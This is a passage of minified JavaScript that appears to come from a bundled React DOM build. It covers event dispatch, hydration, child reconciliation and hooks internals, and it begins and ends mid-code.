x(h,m+"enter",v,t,c),x.target=f,x.relatedTarget=b,y=x),b=y,g&&v)n:{for(x=g,h=v,m=0,f=x;f;f=gt(f))m++;for(f=0,y=h;y;y=gt(y))f++;for(;0<m-f;)x=gt(x),m--;for(;0<f-m;)h=gt(h),f--;for(;m--;){if(x===h||h!==null&&x===h.alternate)break n;x=gt(x),h=gt(h)}x=null}else x=null;g!==null&&pc(d,p,g,x,!1),v!==null&&b!==null&&pc(d,b,v,x,!0)}}e:{if(p=u?At(u):window,g=p.nodeName&&p.nodeName.toLowerCase(),g==="select"||g==="input"&&p.type==="file")var A=Iv;else if(rc(p))if(lm)A=Bv;else{A=Ov;var T=Mv}else(g=p.nodeName)&&g.toLowerCase()==="input"&&(p.type==="checkbox"||p.type==="radio")&&(A=wv);if(A&&(A=A(e,u))){om(d,A,t,c);break e}T&&T(e,p,u),e==="focusout"&&(T=p._wrapperState)&&T.controlled&&p.type==="number"&&Ya(p,"number",p.value)}switch(T=u?At(u):window,e){case"focusin":(rc(T)||T.contentEditable==="true")&&(bt=T,co=u,xi=null);break;case"focusout":xi=co=bt=null;break;case"mousedown":po=!0;break;case"contextmenu":case"mouseup":case"dragend":po=!1,uc(d,t,c);break;case"selectionchange":if(jv)break;case"keydown":case"keyup":uc(d,t,c)}var S;if(Dl)e:{switch(e){case"compositionstart":var C="onCompositionStart";break e;case"compositionend":C="onCompositionEnd";break e;case"compositionupdate":C="onCompositionUpdate";break e}C=void 0}else St?sm(e,t)&&(C="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(C="onCompositionStart");C&&(rm&&t.locale!=="ko"&&(St||C!=="onCompositionStart"?C==="onCompositionEnd"&&St&&(S=im()):(Dn=c,Tl="value"in Dn?Dn.value:Dn.textContent,St=!0)),T=rs(u,C),0<T.length&&(C=new ec(C,e,null,t,c),d.push({event:C,listeners:T}),S?C.data=S:(S=am(t),S!==null&&(C.data=S)))),(S=Lv?Rv(e,t):Dv(e,t))&&(u=rs(u,"onBeforeInput"),0<u.length&&(c=new ec("onBeforeInput","beforeinput",null,t,c),d.push({event:c,listeners:u}),c.data=S))}ym(d,n)})}function Bi(e,n,t){return{instance:e,listener:n,currentTarget:t}}function rs(e,n){for(var t=n+"Capture",i=[];e!==null;){var r=e,s=r.stateNode;r.tag===5&&s!==null&&(r=s,s=Di(e,t),s!=null&&i.unshift(Bi(e,s,r)),s=Di(e,n),s!=null&&i.push(Bi(e,s,r))),e=e.return}return i}function gt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function pc(e,n,t,i,r){for(var s=n._reactName,a=[];t!==null&&t!==i;){var o=t,l=o.alternate,u=o.stateNode;if(l!==null&&l===i)break;o.tag===5&&u!==null&&(o=u,r?(l=Di(t,s),l!=null&&a.unshift(Bi(t,l,o))):r||(l=Di(t,s),l!=null&&a.push(Bi(t,l,o)))),t=t.return}a.length!==0&&e.push({event:n,listeners:a})}var Hv=/\r\n?/g,zv=/\u0000|\uFFFD/g;function mc(e){return(typeof e=="string"?e:""+e).replace(Hv,`
`).replace(zv,"")}function Sr(e,n,t){if(n=mc(n),mc(e)!==n&&t)throw Error(P(425))}function ss(){}var mo=null,fo=null;function ho(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var go=typeof setTimeout=="function"?setTimeout:void 0,Gv=typeof clearTimeout=="function"?clearTimeout:void 0,fc=typeof Promise=="function"?Promise:void 0,Xv=typeof queueMicrotask=="function"?queueMicrotask:typeof fc<"u"?function(e){return fc.resolve(null).then(e).catch(Qv)}:go;function Qv(e){setTimeout(function(){throw e})}function ya(e,n){var t=n,i=0;do{var r=t.nextSibling;if(e.removeChild(t),r&&r.nodeType===8)if(t=r.data,t==="/$"){if(i===0){e.removeChild(r),Ii(n);return}i--}else t!=="$"&&t!=="$?"&&t!=="$!"||i++;t=r}while(t);Ii(n)}function On(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function hc(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var Kt=Math.random().toString(36).slice(2),sn="__reactFiber$"+Kt,Fi="__reactProps$"+Kt,vn="__reactContainer$"+Kt,vo="__reactEvents$"+Kt,Wv="__reactListeners$"+Kt,$v="__reactHandles$"+Kt;function Yn(e){var n=e[sn];if(n)return n;for(var t=e.parentNode;t;){if(n=t[vn]||t[sn]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=hc(e);e!==null;){if(t=e[sn])return t;e=hc(e)}return n}e=t,t=e.parentNode}return null}function er(e){return e=e[sn]||e[vn],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function At(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(P(33))}function Fs(e){return e[Fi]||null}var yo=[],Et=-1;function Hn(e){return{current:e}}function H(e){0>Et||(e.current=yo[Et],yo[Et]=null,Et--)}function V(e,n){Et++,yo[Et]=e.current,e.current=n}var Un={},he=Hn(Un),Ae=Hn(!1),lt=Un;function Vt(e,n){var t=e.type.contextTypes;if(!t)return Un;var i=e.stateNode;if(i&&i.__reactInternalMemoizedUnmaskedChildContext===n)return i.__reactInternalMemoizedMaskedChildContext;var r={},s;for(s in t)r[s]=n[s];return i&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=r),r}function Ee(e){return e=e.childContextTypes,e!=null}function as(){H(Ae),H(he)}function gc(e,n,t){if(he.current!==Un)throw Error(P(168));V(he,n),V(Ae,t)}function Sm(e,n,t){var i=e.stateNode;if(n=n.childContextTypes,typeof i.getChildContext!="function")return t;i=i.getChildContext();for(var r in i)if(!(r in n))throw Error(P(108,Mg(e)||"Unknown",r));return W({},t,i)}function os(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Un,lt=he.current,V(he,e),V(Ae,Ae.current),!0}function vc(e,n,t){var i=e.stateNode;if(!i)throw Error(P(169));t?(e=Sm(e,n,lt),i.__reactInternalMemoizedMergedChildContext=e,H(Ae),H(he),V(he,e)):H(Ae),V(Ae,t)}var dn=null,ks=!1,xa=!1;function bm(e){dn===null?dn=[e]:dn.push(e)}function Kv(e){ks=!0,bm(e)}function zn(){if(!xa&&dn!==null){xa=!0;var e=0,n=F;try{var t=dn;for(F=1;e<t.length;e++){var i=t[e];do i=i(!0);while(i!==null)}dn=null,ks=!1}catch(r){throw dn!==null&&(dn=dn.slice(e+1)),Xp(Cl,zn),r}finally{F=n,xa=!1}}return null}var Pt=[],Tt=0,ls=null,us=0,Oe=[],we=0,ut=null,mn=1,fn="";function $n(e,n){Pt[Tt++]=us,Pt[Tt++]=ls,ls=e,us=n}function Cm(e,n,t){Oe[we++]=mn,Oe[we++]=fn,Oe[we++]=ut,ut=e;var i=mn;e=fn;var r=32-$e(i)-1;i&=~(1<<r),t+=1;var s=32-$e(n)+r;if(30<s){var a=r-r%5;s=(i&(1<<a)-1).toString(32),i>>=a,r-=a,mn=1<<32-$e(n)+r|t<<r|i,fn=s+e}else mn=1<<s|t<<r|i,fn=e}function Nl(e){e.return!==null&&($n(e,1),Cm(e,1,0))}function Il(e){for(;e===ls;)ls=Pt[--Tt],Pt[Tt]=null,us=Pt[--Tt],Pt[Tt]=null;for(;e===ut;)ut=Oe[--we],Oe[we]=null,fn=Oe[--we],Oe[we]=null,mn=Oe[--we],Oe[we]=null}var De=null,Re=null,G=!1,Qe=null;function Am(e,n){var t=Be(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function yc(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,De=e,Re=On(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,De=e,Re=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=ut!==null?{id:mn,overflow:fn}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Be(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,De=e,Re=null,!0):!1;default:return!1}}function xo(e){return(e.mode&1)!==0&&(e.flags&128)===0}function So(e){if(G){var n=Re;if(n){var t=n;if(!yc(e,n)){if(xo(e))throw Error(P(418));n=On(t.nextSibling);var i=De;n&&yc(e,n)?Am(i,t):(e.flags=e.flags&-4097|2,G=!1,De=e)}}else{if(xo(e))throw Error(P(418));e.flags=e.flags&-4097|2,G=!1,De=e}}}function xc(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;De=e}function br(e){if(e!==De)return!1;if(!G)return xc(e),G=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!ho(e.type,e.memoizedProps)),n&&(n=Re)){if(xo(e))throw Em(),Error(P(418));for(;n;)Am(e,n),n=On(n.nextSibling)}if(xc(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(P(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){Re=On(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}Re=null}}else Re=De?On(e.stateNode.nextSibling):null;return!0}function Em(){for(var e=Re;e;)e=On(e.nextSibling)}function _t(){Re=De=null,G=!1}function Ml(e){Qe===null?Qe=[e]:Qe.push(e)}var Jv=bn.ReactCurrentBatchConfig;function si(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(P(309));var i=t.stateNode}if(!i)throw Error(P(147,e));var r=i,s=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===s?n.ref:(n=function(a){var o=r.refs;a===null?delete o[s]:o[s]=a},n._stringRef=s,n)}if(typeof e!="string")throw Error(P(284));if(!t._owner)throw Error(P(290,e))}return e}function Cr(e,n){throw e=Object.prototype.toString.call(n),Error(P(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function Sc(e){var n=e._init;return n(e._payload)}function Pm(e){function n(h,m){if(e){var f=h.deletions;f===null?(h.deletions=[m],h.flags|=16):f.push(m)}}function t(h,m){if(!e)return null;for(;m!==null;)n(h,m),m=m.sibling;return null}function i(h,m){for(h=new Map;m!==null;)m.key!==null?h.set(m.key,m):h.set(m.index,m),m=m.sibling;return h}function r(h,m){return h=kn(h,m),h.index=0,h.sibling=null,h}function s(h,m,f){return h.index=f,e?(f=h.alternate,f!==null?(f=f.index,f<m?(h.flags|=2,m):f):(h.flags|=2,m)):(h.flags|=1048576,m)}function a(h){return e&&h.alternate===null&&(h.flags|=2),h}function o(h,m,f,y){return m===null||m.tag!==6?(m=Ta(f,h.mode,y),m.return=h,m):(m=r(m,f),m.return=h,m)}function l(h,m,f,y){var A=f.type;return A===xt?c(h,m,f.props.children,y,f.key):m!==null&&(m.elementType===A||typeof A=="object"&&A!==null&&A.$$typeof===Pn&&Sc(A)===m.type)?(y=r(m,f.props),y.ref=si(h,m,f),y.return=h,y):(y=_r(f.type,f.key,f.props,null,h.mode,y),y.ref=si(h,m,f),y.return=h,y)}function u(h,m,f,y){return m===null||m.tag!==4||m.stateNode.containerInfo!==f.containerInfo||m.stateNode.implementation!==f.implementation?(m=La(f,h.mode,y),m.return=h,m):(m=r(m,f.children||[]),m.return=h,m)}function c(h,m,f,y,A){return m===null||m.tag!==7?(m=rt(f,h.mode,y,A),m.return=h,m):(m=r(m,f),m.return=h,m)}function d(h,m,f){if(typeof m=="string"&&m!==""||typeof m=="number")return m=Ta(""+m,h.mode,f),m.return=h,m;if(typeof m=="object"&&m!==null){switch(m.$$typeof){case dr:return f=_r(m.type,m.key,m.props,null,h.mode,f),f.ref=si(h,null,m),f.return=h,f;case yt:return m=La(m,h.mode,f),m.return=h,m;case Pn:var y=m._init;return d(h,y(m._payload),f)}if(di(m)||ei(m))return m=rt(m,h.mode,f,null),m.return=h,m;Cr(h,m)}return null}function p(h,m,f,y){var A=m!==null?m.key:null;if(typeof f=="string"&&f!==""||typeof f=="number")return A!==null?null:o(h,m,""+f,y);if(typeof f=="object"&&f!==null){switch(f.$$typeof){case dr:return f.key===A?l(h,m,f,y):null;case yt:return f.key===A?u(h,m,f,y):null;case Pn:return A=f._init,p(h,m,A(f._payload),y)}if(di(f)||ei(f))return A!==null?null:c(h,m,f,y,null);Cr(h,f)}return null}function g(h,m,f,y,A){if(typeof y=="string"&&y!==""||typeof y=="number")return h=h.get(f)||null,o(m,h,""+y,A);if(typeof y=="object"&&y!==null){switch(y.$$typeof){case dr:return h=h.get(y.key===null?f:y.key)||null,l(m,h,y,A);case yt:return h=h.get(y.key===null?f:y.key)||null,u(m,h,y,A);case Pn:var T=y._init;return g(h,m,f,T(y._payload),A)}if(di(y)||ei(y))return h=h.get(f)||null,c(m,h,y,A,null);Cr(m,y)}return null}function v(h,m,f,y){for(var A=null,T=null,S=m,C=m=0,I=null;S!==null&&C<f.length;C++){S.index>C?(I=S,S=null):I=S.sibling;var q=p(h,S,f[C],y);if(q===null){S===null&&(S=I);break}e&&S&&q.alternate===null&&n(h,S),m=s(q,m,C),T===null?A=q:T.sibling=q,T=q,S=I}if(C===f.length)return t(h,S),G&&$n(h,C),A;if(S===null){for(;C<f.length;C++)S=d(h,f[C],y),S!==null&&(m=s(S,m,C),T===null?A=S:T.sibling=S,T=S);return G&&$n(h,C),A}for(S=i(h,S);C<f.length;C++)I=g(S,h,C,f[C],y),I!==null&&(e&&I.alternate!==null&&S.delete(I.key===null?C:I.key),m=s(I,m,C),T===null?A=I:T.sibling=I,T=I);return e&&S.forEach(function(z){return n(h,z)}),G&&$n(h,C),A}function x(h,m,f,y){var A=ei(f);if(typeof A!="function")throw Error(P(150));if(f=A.call(f),f==null)throw Error(P(151));for(var T=A=null,S=m,C=m=0,I=null,q=f.next();S!==null&&!q.done;C++,q=f.next()){S.index>C?(I=S,S=null):I=S.sibling;var z=p(h,S,q.value,y);if(z===null){S===null&&(S=I);break}e&&S&&z.alternate===null&&n(h,S),m=s(z,m,C),T===null?A=z:T.sibling=z,T=z,S=I}if(q.done)return t(h,S),G&&$n(h,C),A;if(S===null){for(;!q.done;C++,q=f.next())q=d(h,q.value,y),q!==null&&(m=s(q,m,C),T===null?A=q:T.sibling=q,T=q);return G&&$n(h,C),A}for(S=i(h,S);!q.done;C++,q=f.next())q=g(S,h,C,q.value,y),q!==null&&(e&&q.alternate!==null&&S.delete(q.key===null?C:q.key),m=s(q,m,C),T===null?A=q:T.sibling=q,T=q);return e&&S.forEach(function(Te){return n(h,Te)}),G&&$n(h,C),A}function b(h,m,f,y){if(typeof f=="object"&&f!==null&&f.type===xt&&f.key===null&&(f=f.props.children),typeof f=="object"&&f!==null){switch(f.$$typeof){case dr:e:{for(var A=f.key,T=m;T!==null;){if(T.key===A){if(A=f.type,A===xt){if(T.tag===7){t(h,T.sibling),m=r(T,f.props.children),m.return=h,h=m;break e}}else if(T.elementType===A||typeof A=="object"&&A!==null&&A.$$typeof===Pn&&Sc(A)===T.type){t(h,T.sibling),m=r(T,f.props),m.ref=si(h,T,f),m.return=h,h=m;break e}t(h,T);break}else n(h,T);T=T.sibling}f.type===xt?(m=rt(f.props.children,h.mode,y,f.key),m.return=h,h=m):(y=_r(f.type,f.key,f.props,null,h.mode,y),y.ref=si(h,m,f),y.return=h,h=y)}return a(h);case yt:e:{for(T=f.key;m!==null;){if(m.key===T)if(m.tag===4&&m.stateNode.containerInfo===f.containerInfo&&m.stateNode.implementation===f.implementation){t(h,m.sibling),m=r(m,f.children||[]),m.return=h,h=m;break e}else{t(h,m);break}else n(h,m);m=m.sibling}m=La(f,h.mode,y),m.return=h,h=m}return a(h);case Pn:return T=f._init,b(h,m,T(f._payload),y)}if(di(f))return v(h,m,f,y);if(ei(f))return x(h,m,f,y);Cr(h,f)}return typeof f=="string"&&f!==""||typeof f=="number"?(f=""+f,m!==null&&m.tag===6?(t(h,m.sibling),m=r(m,f),m.return=h,h=m):(t(h,m),m=Ta(f,h.mode,y),m.return=h,h=m),a(h)):t(h,m)}return b}var Ht=Pm(!0),Tm=Pm(!1),cs=Hn(null),ds=null,Lt=null,Ol=null;function wl(){Ol=Lt=ds=null}function Bl(e){var n=cs.current;H(cs),e._currentValue=n}function bo(e,n,t){for(;e!==null;){var i=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,i!==null&&(i.childLanes|=n)):i!==null&&(i.childLanes&n)!==n&&(i.childLanes|=n),e===t)break;e=e.return}}function Ft(e,n){ds=e,Ol=Lt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(Ce=!0),e.firstContext=null)}function Ue(e){var n=e._currentValue;if(Ol!==e)if(e={context:e,memoizedValue:n,next:null},Lt===null){if(ds===null)throw Error(P(308));Lt=e,ds.dependencies={lanes:0,firstContext:e}}else Lt=Lt.next=e;return n}var Zn=null;function Fl(e){Zn===null?Zn=[e]:Zn.push(e)}function Lm(e,n,t,i){var r=n.interleaved;return r===null?(t.next=t,Fl(n)):(t.next=r.next,r.next=t),n.interleaved=t,yn(e,i)}function yn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var Tn=!1;function kl(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Rm(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function hn(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function wn(e,n,t){var i=e.updateQueue;if(i===null)return null;if(i=i.shared,B&2){var r=i.pending;return r===null?n.next=n:(n.next=r.next,r.next=n),i.pending=n,yn(e,t)}return r=i.interleaved,r===null?(n.next=n,Fl(i)):(n.next=r.next,r.next=n),i.interleaved=n,yn(e,t)}function Br(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var i=n.lanes;i&=e.pendingLanes,t|=i,n.lanes=t,Al(e,t)}}function bc(e,n){var t=e.updateQueue,i=e.alternate;if(i!==null&&(i=i.updateQueue,t===i)){var r=null,s=null;if(t=t.firstBaseUpdate,t!==null){do{var a={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};s===null?r=s=a:s=s.next=a,t=t.next}while(t!==null);s===null?r=s=n:s=s.next=n}else r=s=n;t={baseState:i.baseState,firstBaseUpdate:r,lastBaseUpdate:s,shared:i.shared,effects:i.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function ps(e,n,t,i){var r=e.updateQueue;Tn=!1;var s=r.firstBaseUpdate,a=r.lastBaseUpdate,o=r.shared.pending;if(o!==null){r.shared.pending=null;var l=o,u=l.next;l.next=null,a===null?s=u:a.next=u,a=l;var c=e.alternate;c!==null&&(c=c.updateQueue,o=c.lastBaseUpdate,o!==a&&(o===null?c.firstBaseUpdate=u:o.next=u,c.lastBaseUpdate=l))}if(s!==null){var d=r.baseState;a=0,c=u=l=null,o=s;do{var p=o.lane,g=o.eventTime;if((i&p)===p){c!==null&&(c=c.next={eventTime:g,lane:0,tag:o.tag,payload:o.payload,callback:o.callback,next:null});e:{var v=e,x=o;switch(p=n,g=t,x.tag){case 1:if(v=x.payload,typeof v=="function"){d=v.call(g,d,p);break e}d=v;break e;case 3:v.flags=v.flags&-65537|128;case 0:if(v=x.payload,p=typeof v=="function"?v.call(g,d,p):v,p==null)break e;d=W({},d,p);break e;case 2:Tn=!0}}o.callback!==null&&o.lane!==0&&(e.flags|=64,p=r.effects,p===null?r.effects=[o]:p.push(o))}else g={eventTime:g,lane:p,tag:o.tag,payload:o.payload,callback:o.callback,next:null},c===null?(u=c=g,l=d):c=c.next=g,a|=p;if(o=o.next,o===null){if(o=r.shared.pending,o===null)break;p=o,o=p.next,p.next=null,r.lastBaseUpdate=p,r.shared.pending=null}}while(!0);if(c===null&&(l=d),r.baseState=l,r.firstBaseUpdate=u,r.lastBaseUpdate=c,n=r.shared.interleaved,n!==null){r=n;do a|=r.lane,r=r.next;while(r!==n)}else s===null&&(r.shared.lanes=0);dt|=a,e.lanes=a,e.memoizedState=d}}function Cc(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var i=e[n],r=i.callback;if(r!==null){if(i.callback=null,i=t,typeof r!="function")throw Error(P(191,r));r.call(i)}}}var nr={},on=Hn(nr),ki=Hn(nr),ji=Hn(nr);function et(e){if(e===nr)throw Error(P(174));return e}function jl(e,n){switch(V(ji,n),V(ki,e),V(on,nr),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:eo(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=eo(n,e)}H(on),V(on,n)}function zt(){H(on),H(ki),H(ji)}function Dm(e){et(ji.current);var n=et(on.current),t=eo(n,e.type);n!==t&&(V(ki,e),V(on,t))}function Ul(e){ki.current===e&&(H(on),H(ki))}var X=Hn(0);function ms(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Sa=[];function Vl(){for(var e=0;e<Sa.length;e++)Sa[e]._workInProgressVersionPrimary=null;Sa.length=0}var Fr=bn.ReactCurrentDispatcher,ba=bn.ReactCurrentBatchConfig,ct=0,Q=null,ne=null,re=null,fs=!1,Si=!1,Ui=0,Yv=0;function pe(){throw Error(P(321))}function _l(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Ye(e[t],n[t]))return!1;return!0}function Hl(e,n,t,i,r,s){if(ct=s,Q=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,Fr.current=e===null||e.memoizedState===null?t2:i2,e=t(i,r),Si){s=0;do{if(Si=!1,Ui=0,25<=s)throw Error(P(301));s+=1,re=ne=null,n.updateQueue=null,Fr.current=r2,e=t(i,r)}while(Si)}if(Fr.current=hs,n=ne!==null&&ne.next!==null,ct=0,re=ne=Q=null,fs=!1,n)throw Error(P(300));return e}function zl(){var e=Ui!==0;return Ui=0,e}function nn(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return re===null?Q.memoizedState=re=e:re=re.next=e,re}function Ve(){if(ne===null){var e=Q.alternate;e=e!==null?e.memoizedState:null}else e=ne.next;var n=re===null?Q.memoizedState:re.next;if(n!==null)re=n,ne=e;else{if(e===null)throw Error(P(310));ne=e,e={memoizedState:ne.memoizedState,baseState:ne.baseState,baseQueue:ne.baseQueue,queue:ne.queue,next:null},re===null?Q.memoizedState=re=e:re=re.next=e}return re}function Vi(e,n){return typeof n=="function"?n(e):n}function Ca(e){var n=Ve(),t=n.queue;if(t===null)throw Error(P(311));t.lastRenderedReducer=e;var i=ne,r=i.baseQueue,s=t.pending;if(s!==null){if(r!==null){var a=r.next;r.next=s.next,s.next=a}i.baseQueue=r=s,t.pending=null}if(r!==null){s=r.next,i=i.baseState;var o=a=null,l=null,u=s;do{var c=u.lane;if((ct&c)===c)l!==null&&(l=l.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),i=u.hasEagerState?u.eagerState:e(i,u.action);else{var d={lane:c,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};l===null?(o=l=d,a=i):l=l.next=d,Q.lanes|=c,dt|=c}u=u.next}while(u!==null&&u!==s);l===null?a=i:l.next=o,Ye(i,n.memoizedState)||(Ce=!0),n.memoizedState=i,n.baseState=a,n.baseQueue=l,t.lastRenderedState=i}if(e=t.interleaved,e!==null){r=e;do s=r.lane,Q.lanes|=s,dt|=s,r=r.next;while(r!==e)}else r===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function Aa(e){var n=Ve(),t=n.queue;if(t===null)throw Error(P(311));t.lastRenderedReducer=e;var i=t.dispatch,r=t.pending,s=n.memoizedState;if(r!==null){t.pending=null;var a=r=r.next;do s=e(s,a.action),a=a.next;while(a!==r);Ye(s,n.memoizedState)||(Ce=!0),n.memoizedState=s,n.baseQueue===null&&(n.baseState=s),t.lastRenderedState=s}return[s,i]}function qm(){}function Nm(e,n){var t=Q,i=Ve(),r=n(),s=!Ye(i.memoizedState,r);if(s&&(i.memoizedState=r,Ce=!0),i=i.queue,Gl(Om.bind(null,t,i,e),[e]),i.getSnapshot!==n||s||re!==null&&re.memoizedState.tag&1){if(t.flags|=2048,_i(9,Mm.bind(null,t,i,r,n),void 0,null),se===null)throw Error(P(349));ct&30||Im(t,n,r)}return r}function Im(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=Q.updateQueue,n===null?(n={lastEffect:null,stores:null},Q.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Mm(e,n,t,i){n.value=t,n.getSnapshot=i,wm(n)&&Bm(e)}function Om(e,n,t){return t(function(){wm(n)&&Bm(e)})}function wm(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Ye(e,t)}catch{return!0}}function Bm(e){var n=yn(e,1);n!==null&&Ke(n,e,1,-1)}function Ac(e){var n=nn();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Vi,lastRenderedState:e},n.queue=e,e=e.dispatch=n2.bind(null,Q,e),[n.memoizedState,e]}function _i(e,n,t,i){return e={tag:e,create:n,destroy:t,deps:i,next:null},n=Q.updateQueue,n===null?(n={lastEffect:null,stores:null},Q.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(i=t.next,t.next=e,e.next=i,n.lastEffect=e)),e}function Fm(){return Ve().memoizedState}function kr(e,n,t,i){var r=nn();Q.flags|=e,r.memoizedState=_i(1|n,t,void 0,i===void 0?null:i)}function js(e,n,t,i){var r=Ve();i=i===void 0?null:i;var s=void 0;if(ne!==null){var a=ne.memoizedState;if(s=a.destroy,i!==null&&_l(i,a.deps)){r.memoizedState=_i(n,t,s,i);return}}Q.flags|=e,r.memoizedState=_i(1|n,t,s,i)}function Ec(e,n){return kr(8390656,8,e,n)}function Gl(e,n){return js(2048,8,e,n)}function km(e,n){return js(4,2,e,n)}function jm(e,n){return js(4,4,e,n)}function Um(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Vm(e,n,t){return t=t!=null?t.concat([e]):null,js(4,4,Um.bind(null,n,e),t)}function Xl(){}function _m(e,n){var t=Ve();n=n===void 0?null:n;var i=t.memoizedState;return i!==null&&n!==null&&_l(n,i[1])?i[0]:(t.memoizedState=[e,n],e)}function Hm(e,n){var t=Ve();n=n===void 0?null:n;var i=t.memoizedState;return i!==null&&n!==null&&_l(n,i[1])?i[0]:(e=e(),t.memoizedState=[e,n],e)}function zm(e,n,t){return ct&21?(Ye(t,n)||(t=$p(),Q.lanes|=t,dt|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,Ce=!0),e.memoizedState=t)}function Zv(e,n){var t=F;F=t!==0&&4>t?t:4,e(!0);var i=ba.transition;ba.transition={};try{e(!1),n()}finally{F=t,ba.transition=i}}function Gm(){return Ve().memoizedState}function e2(e,n,t){var i=Fn(e);if(t={lane:i,action:t,hasEagerState:!1,eagerState:null,next:null},Xm(e))Qm(n,t);else if(t=Lm(e,n,t,i),t!==null){var r=ye();Ke(t,e,i,r),Wm(t,n,i)}}function n2(e,n,t){var i=Fn(e),r={lane:i,action:t,hasEagerState:!1,eagerState:null,next:null};if(Xm(e))Qm(n,r);else{var s=e.alternate;if(e.lanes===0&&(s===null||s.lanes===0)&&(s=n.lastRenderedReducer,s!==null))try{var a=n.lastRenderedState,o=s(a,t);if(r.hasEagerState=!0,r.eagerState=o,Ye(o,a)){var l=n.interleaved;l===null?(r.next=r,Fl(n)):(r.next=l.next,l.next=r),n.interleaved=r;return}}catch{}finally{}t=Lm(e,n,r,i),t!==null&&(r=ye(),Ke(t,e,i,r),Wm(t,n,i))}}function Xm(e){var n=e.alternate;return e===Q||n!==null&&n===Q}function Qm(e,n){Si=fs=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function Wm(e,n,t){if(t&4194240){var i=n.lanes;i&=e.pendingLanes,t|=i,n.lanes=t,Al(e,t)}}var 